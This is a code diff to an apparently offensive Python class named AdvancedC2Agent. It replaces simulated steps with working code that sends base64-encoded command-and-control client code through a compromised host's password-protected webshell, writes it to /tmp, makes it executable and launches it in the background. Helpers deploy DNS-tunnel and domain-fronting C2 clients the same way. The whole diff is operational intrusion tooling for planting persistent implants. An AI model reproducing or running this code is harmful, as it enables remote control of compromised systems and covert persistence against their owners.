@@ -236,9 +236,8 @@ class AdvancedC2Agent(BaseAgent):
         except Exception as e:
             log.error(f"[AdvancedC2Agent] Failed to setup WebSocket C2: {e}")
             return None
-    
-    async def _deploy_c2_client(self, c2_config: Dict, backdoor_info: Dict):
-        """Deploy C2 client on target"""
+        async def _deploy_http_c2_client(self, c2_config: Dict, backdoor_info: Dict):
+        """Deploy C2 client on target via webshell"""
         try:
             # Generate C2 client code
             client_code = self._generate_http_c2_client(c2_config)
@@ -246,36 +245,97 @@ class AdvancedC2Agent(BaseAgent):
             # Deploy via backdoor
             log.info("[AdvancedC2Agent] Deploying C2 client...")
             
-            # Simulate deployment
-            await asyncio.sleep(1)
+            shell_url = backdoor_info.get("shell_url")
+            shell_password = backdoor_info.get("password", "")
             
-            log.success("[AdvancedC2Agent] C2 client deployed")
+            if not shell_url:
+                log.error("[AdvancedC2Agent] No shell URL provided")
+                return
+            
+            # Write C2 client to target
+            import httpx
+            import base64
+            
+            # Encode client code
+            encoded = base64.b64encode(client_code.encode()).decode()
+            
+            # Write to file via webshell
+            target_path = "/tmp/c2_client.py"
+            write_cmd = f'echo "{encoded}" | base64 -d > {target_path} && chmod +x {target_path}'
+            
+            async with httpx.AsyncClient(verify=False, timeout=30.0) as client:
+                data = {"cmd": write_cmd, "pass": shell_password}
+                response = await client.post(shell_url, data=data)
+                
+                if response.status_code == 200:
+                    log.success("[AdvancedC2Agent] C2 client deployed")
+                    
+                    # Start C2 client in background
+                    start_cmd = f"nohup python3 {target_path} > /dev/null 2>&1 &"
+                    await client.post(shell_url, data={"cmd": start_cmd, "pass": shell_password})
+                    log.success("[AdvancedC2Agent] C2 client started")
+                else:
+                    log.error(f"[AdvancedC2Agent] Deployment failed: HTTP {response.status_code}")
             
         except Exception as e:
             log.error(f"[AdvancedC2Agent] Failed to deploy C2 client: {e}")
-            raise
-    
+            raise 
     async def _deploy_dns_tunnel_client(self, c2_config: Dict, backdoor_info: Dict):
-        """Deploy DNS tunnel client"""
+        """Deploy DNS tunnel client via webshell"""
         try:
             client_code = self._generate_dns_tunnel_client(c2_config)
             log.info("[AdvancedC2Agent] Deploying DNS tunnel client...")
-            await asyncio.sleep(1)
+            
+            # Use same deployment method as HTTP C2
+            await self._deploy_code_via_shell(client_code, backdoor_info, "/tmp/dns_tunnel.py")
+            
             log.success("[AdvancedC2Agent] DNS tunnel client deployed")
         except Exception as e:
             log.error(f"[AdvancedC2Agent] Failed to deploy DNS tunnel client: {e}")
             raise
     
     async def _deploy_domain_fronting_client(self, c2_config: Dict, backdoor_info: Dict):
-        """Deploy domain fronting client"""
+        """Deploy domain fronting client via webshell"""
         try:
             client_code = self._generate_domain_fronting_client(c2_config)
             log.info("[AdvancedC2Agent] Deploying domain fronting client...")
-            await asyncio.sleep(1)
+            
+            # Use same deployment method
+            await self._deploy_code_via_shell(client_code, backdoor_info, "/tmp/df_client.py")
+            
             log.success("[AdvancedC2Agent] Domain fronting client deployed")
         except Exception as e:
             log.error(f"[AdvancedC2Agent] Failed to deploy domain fronting client: {e}")
             raise
+    
+    async def _deploy_code_via_shell(self, code: str, backdoor_info: Dict, target_path: str):
+        """Helper method to deploy code via webshell"""
+        import httpx
+        import base64
+        
+        shell_url = backdoor_info.get("shell_url")
+        shell_password = backdoor_info.get("password", "")
+        
+        if not shell_url:
+            raise Exception("No shell URL provided")
+        
+        # Encode code
+        encoded = base64.b64encode(code.encode()).decode()
+        
+        # Write to file
+        write_cmd = f'echo "{encoded}" | base64 -d > {target_path} && chmod +x {target_path}'
+        
+        async with httpx.AsyncClient(verify=False, timeout=30.0) as client:
+            data = {"cmd": write_cmd, "pass": shell_password}
+            response = await client.post(shell_url, data=data)
+            
+            if response.status_code == 200:
+                # Start in background
+                start_cmd = f"nohup python3 {target_path} > /dev/null 2>&1 &"
+                await client.post(shell_url, data={"cmd": start_cmd, "pass": shell_password})
+                return True
+            else:
+                raise Exception(f"HTTP {response.status_code}")
     
     async def _deploy_websocket_client(self, c2_config: Dict, backdoor_info: Dict):
         """Deploy WebSocket client"""
